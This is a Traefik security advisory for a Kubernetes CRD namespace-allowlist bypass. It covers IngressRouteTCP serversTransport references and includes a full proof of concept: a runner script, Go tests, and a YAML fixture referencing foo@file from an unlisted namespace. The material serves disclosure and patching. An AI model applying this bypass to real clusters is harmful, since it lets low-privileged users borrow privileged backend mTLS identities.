# [M] Traefik CRD IngressRouteTCP ServersTransport Cross-Provider Namespace Bypass

## Summary
Severity: Medium
Advisory: GHSA-42cj-m3vj-89wv
CVE: CVE-2026-65602
CWE: CWE-863
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:N/VI:N/VA:N/SC:H/SI:H/SA:N (CVSS_V4)
Published: 2026-08-05
Source: https://github.com/advisories/GHSA-42cj-m3vj-89wv
Type: github-advisory

## Affected
- Go: `github.com/traefik/traefik/v3` — affected >=3.6.0 <3.6.23
- Go: `github.com/traefik/traefik/v3` — affected >=3.7.0 <3.7.7

## Details
## Summary

There is a medium-severity cross-provider reference vulnerability in Traefik's Kubernetes CRD provider. The `crossProviderNamespaces` allowlist is enforced for HTTP `serversTransport` references but was not enforced for `IngressRouteTCP` service `serversTransport` references. A low-privileged Kubernetes user in a namespace that is not listed in `crossProviderNamespaces` could set `serversTransport: foo@file` on an `IngressRouteTCP` service, causing Traefik to accept the forbidden cross-provider reference and use the file-provider `TCPServersTransport` — including privileged backend mTLS client certificates, SPIFFE identity, or PROXY-protocol settings. The fix applies the `crossProviderNamespaces` allowlist to TCP `serversTransport` references.

## Patches

- https://github.com/traefik/traefik/releases/tag/v3.6.23
- https://github.com/traefik/traefik/releases/tag/v3.7.7

## For more information

If you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).

<details>
<summary>Original Description</summary>

## Summary

Traefik's Kubernetes CRD provider enforces `crossProviderNamespaces` for several
cross-provider references, but `IngressRouteTCP` service
`serversTransport` references skip that allowlist. A low-privileged Kubernetes
user in a namespace that is not listed in `crossProviderNamespaces` can still
set `serversTransport: foo@file` on an `IngressRouteTCP` service. Traefik
accepts the forbidden cross-provider reference and later uses the referenced
`TCPServersTransport`, including privileged backend mTLS client certificates,
SPIFFE identity, or PROXY protocol settings.

## Description

`crossProviderNamespaces` is documented and implemented as an allowlist for
namespaces that may declare cross-provider references from Kubernetes CRD
objects. HTTP `serversTransport` references enforce that allowlist. TCP
`serversTransport` references do not.

An attacker with low Kubernetes privileges in namespace `default` can create an
`IngressRouteTCP` service with:

```yaml
serversTransport: foo@file
```

Even when the provider is configured with:

```yaml
crossProviderNamespaces:
  - operator-only
```

Traefik still emits a TCP dynamic service whose load balancer points to
`foo@file`. At runtime, `DialerManager.Build()` uses the exact referenced
transport name and applies that transport's TLS client certificates and related
backend-connection settings.

## Impact

The PoC demonstrates two positive facts:

1. A namespace outside `crossProviderNamespaces` can cause Traefik to accept and
   store `LoadBalancer.ServersTransport = "foo@file"` from an
   `IngressRouteTCP` service.
2. A qualified `foo@file` `TCPServersTransport` with a client certificate is
   actually consumed by the TCP dialer and presented to an mTLS backend.

This proves a backend identity relay primitive: a lower-privileged CRD author
can make Traefik connect to a backend using an operator-defined cross-provider
transport identity that the namespace should not be allowed to reference.

## Proof Of Concept

### Files

- `run.sh`: portable runner.
- `poc_crd_test.go`: positive CRD provider proof.
- `with_servers_transport_cross_provider_poc.yml`: minimal
  `IngressRouteTCP` fixture.
- `poc_tcp_mtls_test.go`: positive runtime mTLS identity-use proof.

<details>
<summary>run.sh</summary>

```bash
#!/usr/bin/env sh
set -eu

TARGET_REF="${TARGET_REF:-v3.7.5}"
REPO_URL="${REPO_URL:-https://github.com/traefik/traefik.git}"
SCRIPT_DIR="$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)"
WORKDIR="${WORKDIR:-$(mktemp -d "${TMPDIR:-/tmp}/traefik-tcp-st-poc.XXXXXX")}"

if [ "${KEEP_WORKDIR:-0}" != "1" ]; then
	trap 'rm -rf "$WORKDIR"' EXIT INT TERM
fi

echo "[*] target_ref=$TARGET_REF"
echo "[*] workdir=$WORKDIR"

if [ -n "${TRAEFIK_SRC:-}" ]; then
	echo "[*] cloning from local source: $TRAEFIK_SRC"
	git clone -q "$TRAEFIK_SRC" "$WORKDIR/traefik"
	cd "$WORKDIR/traefik"
	git -c advice.detachedHead=false checkout -q "$TARGET_REF"
else
	echo "[*] cloning from remote: $REPO_URL"
	git -c advice.detachedHead=false clone -q --depth 1 --branch "$TARGET_REF" "$REPO_URL" "$WORKDIR/traefik"
	cd "$WORKDIR/traefik"
fi

mkdir -p pkg/provider/kubernetes/crd/fixtures/tcp
cp "$SCRIPT_DIR/poc_crd_test.go" \
	 pkg/provider/kubernetes/crd/tcp_serverstransport_cross_provider_poc_test.go
cp "$SCRIPT_DIR/with_servers_transport_cross_provider_poc.yml" \
	 pkg/provider/kubernetes/crd/fixtures/tcp/with_servers_transport_cross_provider_poc.yml
cp "$SCRIPT_DIR/poc_tcp_mtls_test.go" \
	 pkg/tcp/dialer_cross_provider_identity_poc_test.go

echo "[*] running CRD provider policy-bypass PoC"
go test ./pkg/provider/kubernetes/crd \
	-run '^TestPoCTCPServersTransportCrossProviderNamespacesBypass$' \
	-count=1 -v

echo "[*] running TCPServersTransport mTLS identity-use PoC"
go test ./pkg/tcp \
	-run '^TestPoCQualifiedTCPServersTransportPresentsFileMTLSIdentity$' \
	-count=1 -v

echo "POC_RESULT=PASS"
```

</details>

<details>
<summary>poc_crd_test.go</summary>

```go
package crd

import (
	"testing"

	"github.com/stretchr/testify/require"
	traefikcrdfake "github.com/traefik/traefik/v3/pkg/provider/kubernetes/crd/generated/clientset/versioned/fake"
	kubefake "k8s.io/client-go/kubernetes/fake"
)

func TestPoCTCPServersTransportCrossProviderNamespacesBypass(t *testing.T) {
	k8sObjects, crdObjects := readResources(t, []string{
		"tcp/services.yml",
		"tcp/with_servers_transport_cross_provider_poc.yml",
	})

	kubeClient := kubefake.NewClientset(k8sObjects...)
	crdClient := traefikcrdfake.NewClientset(crdObjects...)
	client := newClientImpl(kubeClient, crdClient)

	stopCh := make(chan struct{})
	defer close(stopCh)

	eventCh, err := client.WatchAll(nil, stopCh)
	require.NoError(t, err)
	<-eventCh

	provider := Provider{
		AllowCrossNamespace:     true,
		CrossProviderNamespaces: []string{"operator-only"},
	}

	conf := provider.loadConfigurationFromCRD(t.Context(), client)
	service := conf.TCP.Services["default-test.route-fdd3e9338e47a45efefc"]
	require.NotNil(t, service)
	require.NotNil(t, service.LoadBalancer)
	require.Equal(t, "foo@file", service.LoadBalancer.ServersTransport)
	require.NotEmpty(t, service.LoadBalancer.Servers)
	require.True(t, service.LoadBalancer.Servers[0].TLS)

	t.Logf("POC_CRD_RESULT=accepted route_namespace=default allowed_cross_provider_namespaces=%v serversTransport=%q backend_tls=%v",
		provider.CrossProviderNamespaces,
		service.LoadBalancer.ServersTransport,
		service.LoadBalancer.Servers[0].TLS)
}
```

</details>

<details>
<summary>poc_tcp_mtls_test.go</summary>

```go
package tcp

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"fmt"
	"io"
	"math/big"
	"net"
	"testing"
	"time"

	"github.com/stretchr/testify/require"
	"github.com/traefik/traefik/v3/pkg/config/dynamic"
	traefiktls "github.com/traefik/traefik/v3/pkg/tls"
	"github.com/traefik/traefik/v3/pkg/types"
)

func TestPoCQualifiedTCPServersTransportPresentsFileMTLSIdentity(t *testing.T) {
	pki := newPoCPKI(t)

	dialerManager := NewDialerManager(nil)
	dialerManager.Update(map[string]*dynamic.TCPServersTransport{
		"foo@file": {
			TLS: &dynamic.TLSClientConfig{
				ServerName: "example.com",
				RootCAs:    []types.FileOrContent{types.FileOrContent(pki.caCertPEM)},
				Certificates: traefiktls.Certificates{
					traefiktls.Certificate{
						CertFile: types.FileOrContent(pki.clientCertPEM),
						KeyFile:  types.FileOrContent(pki.clientKeyPEM),
					},
				},
			},
		},
	})

	backendAddr, peerCN, done, closeBackend := newPoCMTLSBackend(t, pki)
	defer closeBackend()

	dialer, err := dialerManager.Build(&dynamic.TCPServersLoadBalancer{ServersTransport: "foo@file"}, true)
	require.NoError(t, err)

	conn, err := dialer.Dial("tcp", backendAddr, nil)
	require.NoError(t, err)
	defer conn.Close()

	_, err = conn.Write([]byte("ping"))
	require.NoError(t, err)

	buf := make([]byte, 4)
	_, err = io.ReadFull(conn, buf)
	require.NoError(t, err)
	require.Equal(t, "PONG", string(buf))

	var cn string
	select {
	case cn = <-peerCN:
	case <-time.After(time.Second):
		t.Fatal("timed out waiting for backend peer certificate")
	}

	select {
	case err := <-done:
		require.NoError(t, err)
	case <-time.After(time.Second):
		t.Fatal("timed out waiting for backend completion")
	}

	t.Logf("POC_MTLS_RESULT=backend_accepted_transport_identity serversTransport=%q peer_cn=%q response=%q",
		"foo@file", cn, string(buf))
}

func newPoCMTLSBackend(t *testing.T, pki poCPKI) (string, <-chan string, <-chan error, func()) {
	t.Helper()

	serverCert, err := tls.X509KeyPair(pki.serverCertPEM, pki.serverKeyPEM)
	require.NoError(t, err)

	clientPool := x509.NewCertPool()
	require.True(t, clientPool.AppendCertsFromPEM(pki.caCertPEM))

	listener, err := net.Listen("tcp", "127.0.0.1:0")
	require.NoError(t, err)

	tlsListener := tls.NewListener(listener, &tls.Config{
		Certificates: []tls.Certificate{serverCert},
		ClientAuth:   tls.RequireAndVerifyClientCert,
		ClientCAs:    clientPool,
	})

	peerCN := make(chan string, 1)
	done := make(chan error, 1)

	go func() {
		conn, err := tlsListener.Accept()
		if err != nil {
			done <- err
			return
		}
		defer conn.Close()

		tlsConn, ok := conn.(*tls.Conn)
		if !ok {
			done <- fmt.Errorf("unexpected connection type %T", conn)
			return
		}

		if err := tlsConn.Handshake(); err != nil {
			done <- err
			return
		}

		state := tlsConn.ConnectionState()
		if len(state.PeerCertificates) == 0 {
			done <- fmt.Errorf("missing peer certificate")
			return
		}
		peerCN <- state.PeerCertificates[0].Subject.CommonName

		buf := make([]byte, 4)
		if _, err := io.ReadFull(tlsConn, buf); err != nil {
			done <- err
			return
		}
		if string(buf) != "ping" {
			done <- fmt.Errorf("unexpected backend payload %q", string(buf))
			return
		}

		_, err = tlsConn.Write([]byte("PONG"))
		done <- err
	}()

	return listener.Addr().String(), peerCN, done, func() {
		_ = tlsListener.Close()
	}
}

type poCPKI struct {
	caCertPEM     []byte
	serverCertPEM []byte
	serverKeyPEM  []byte
	clientCertPEM []byte
	clientKeyPEM  []byte
}

func newPoCPKI(t *testing.T) poCPKI {
	t.Helper()

	caKey, err := rsa.GenerateKey(rand.Reader, 2048)
	require.NoError(t, err)

	caTemplate := &x509.Certificate{
		SerialNumber:          big.NewInt(1),
		Subject:               pkix.Name{CommonName: "poc-ca"},
		NotBefore:             time.Now().Add(-time.Minute),
		NotAfter:              time.Now().Add(time.Hour),
		KeyUsage:              x509.KeyUsageCertSign | x509.KeyUsageCRLSign,
		BasicConstraintsValid: true,
		IsCA:                  true,
	}

	caDER, err := x509.CreateCertificate(rand.Reader, caTemplate, caTemplate, &caKey.PublicKey, caKey)
	require.NoError(t, err)

	serverCertPEM, serverKeyPEM := newPoCLeafCert(t, caTemplate, caKey, "poc-server", []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth})
	clientCertPEM, clientKeyPEM := newPoCLeafCert(t, caTemplate, caKey, "example.com", []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth})

	return poCPKI{
		caCertPEM:     pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: caDER}),
		serverCertPEM: serverCertPEM,
		serverKeyPEM:  serverKeyPEM,
		clientCertPEM: clientCertPEM,
		clientKeyPEM:  clientKeyPEM,
	}
}

func newPoCLeafCert(t *testing.T, caTemplate *x509.Certificate, caKey *rsa.PrivateKey, cn string, eku []x509.ExtKeyUsage) ([]byte, []byte) {
	t.Helper()

	key, err := rsa.GenerateKey(rand.Reader, 2048)
	require.NoError(t, err)

	serial, err := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	require.NoError(t, err)

	template := &x509.Certificate{
		SerialNumber: serial,
		Subject:      pkix.Name{CommonName: cn},
		DNSNames:     []string{"example.com"},
		NotBefore:    time.Now().Add(-time.Minute),
		NotAfter:     time.Now().Add(time.Hour),
		KeyUsage:     x509.KeyUsageDigitalSignature | x509.KeyUsageKeyEncipherment,
		ExtKeyUsage:  eku,
	}

	certDER, err := x509.CreateCertificate(rand.Reader, template, caTemplate, &key.PublicKey, caKey)
	require.NoError(t, err)

	keyDER := x509.MarshalPKCS1PrivateKey(key)

	return pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER}),
		pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: keyDER})
}
```

</details>

<details>
<summary>with_servers_transport_cross_provider_poc.yml</summary>

```yaml
apiVersion: traefik.io/v1alpha1
kind: IngressRouteTCP
metadata:
  name: test.route
  namespace: default

spec:
  entryPoints:
    - foo

  routes:
  - match: HostSNI(`foo.com`)
    priority: 12
    services:
    - name: whoamitcp
      port: 8000
      tls: true
      serversTransport: foo@file
```

</details>

### Requirements

- `git`
- Go toolchain compatible with the target Traefik tag. `v3.7.5` uses
  `go 1.25.0`.
- Network access to clone `https://github.com/traefik/traefik.git` and download
  Go modules on first run.

No local Traefik checkout is required by default.

### Run

```sh
./run.sh
```

Optional target override:

```sh
TARGET_REF=v3.6.21 ./run.sh
```

Optional local-source override for faster local validation:

```sh
TRAEFIK_SRC=/path/to/traefik TARGET_REF=v3.7.5 ./run.sh
```

### Expected Result

The run should end with:

```text
POC_CRD_RESULT=accepted route_namespace=default allowed_cross_provider_namespaces=[operator-only] serversTransport="foo@file" backend_tls=true
POC_MTLS_RESULT=backend_accepted_transport_identity serversTransport="foo@file" peer_cn="example.com" response="PONG"
POC_RESULT=PASS
```

## Root Cause

Line numbers below are from:

```text
repository: https://github.com/traefik/traefik
tag:        v3.7.5
commit:     26c96a3935cafb473f4a5bae1886560d9aa4e4f0
```

### 1. The provider option is meant to cover IngressRouteTCP

`pkg/provider/kubernetes/crd/kubernetes.go:60`

```go
CrossProviderNamespaces []string `description:"List of namespaces from which IngressRoute, IngressRouteTCP, IngressRouteUDP, and TraefikService are allowed to declare cross-provider references." ...`
```

This establishes the security invariant: `IngressRouteTCP` cross-provider
references should be gated by `crossProviderNamespaces`.

### 2. TCP service creation forwards the attacker-controlled transport name

`pkg/provider/kubernetes/crd/kubernetes_tcp.go:183-185`

```go
if service.ServersTransport != "" {
	tcpService.LoadBalancer.ServersTransport, err = p.makeTCPServersTransportKey(parentNamespace, service.ServersTransport)
}
```

The attacker-controlled `serversTransport` field is passed into the key builder.

### 3. TCP key builder returns cross-provider names without the allowlist check

`pkg/provider/kubernetes/crd/kubernetes_tcp.go:321-322`

```go
if strings.Contains(serversTransportName, providerNamespaceSeparator) {
	return serversTransportName, nil
}
```

This accepts `foo@file` directly. There is no call to
`isCrossProviderNamespaceAllowed(...)` on this TCP path.

### 4. HTTP sibling contains the missing authorization gate

`pkg/provider/kubernetes/crd/kubernetes_http.go:507-508`

```go
if !isCrossProviderNamespaceAllowed(c.crossProviderNamespaces, parentNamespace) {
	return "", fmt.Errorf("serversTransport %q reference is not allowed: namespace %q is not in crossProviderNamespaces", ...)
}
```

The HTTP path proves the intended policy: cross-provider `serversTransport`
references should be rejected when the route namespace is not in the allowlist.

### 5. Runtime TCP dialer consumes the exact referenced transport

`pkg/tcp/dialer.go:135-141`

```go
if config.ServersTransport != "" {
	name = config.ServersTransport
}
st, ok := d.serversTransports[name]
```

`pkg/tcp/dialer.go:183-188`

```go
tlsConfig = &tls.Config{
	ServerName:   st.TLS.ServerName,
	Certificates: st.TLS.Certificates.GetCertificates(),
}
```

The accepted `foo@file` reference is not a harmless string. It selects the
cross-provider transport and applies its client TLS identity during backend
connections.

</details>

---

## References
- https://github.com/traefik/traefik/security/advisories/GHSA-42cj-m3vj-89wv
- https://nvd.nist.gov/vuln/detail/CVE-2026-65602
- https://github.com/traefik/traefik/pull/13458
- https://github.com/traefik/traefik/commit/67501cbe7bc7774e26ecbd1c29af97f098e14b0b
- https://github.com/traefik/traefik
- https://github.com/traefik/traefik/releases/tag/v3.6.23
- https://github.com/traefik/traefik/releases/tag/v3.7.7
- https://www.vulncheck.com/advisories/traefik-before-ingressroutetcp-serverstransport-namespace-bypass
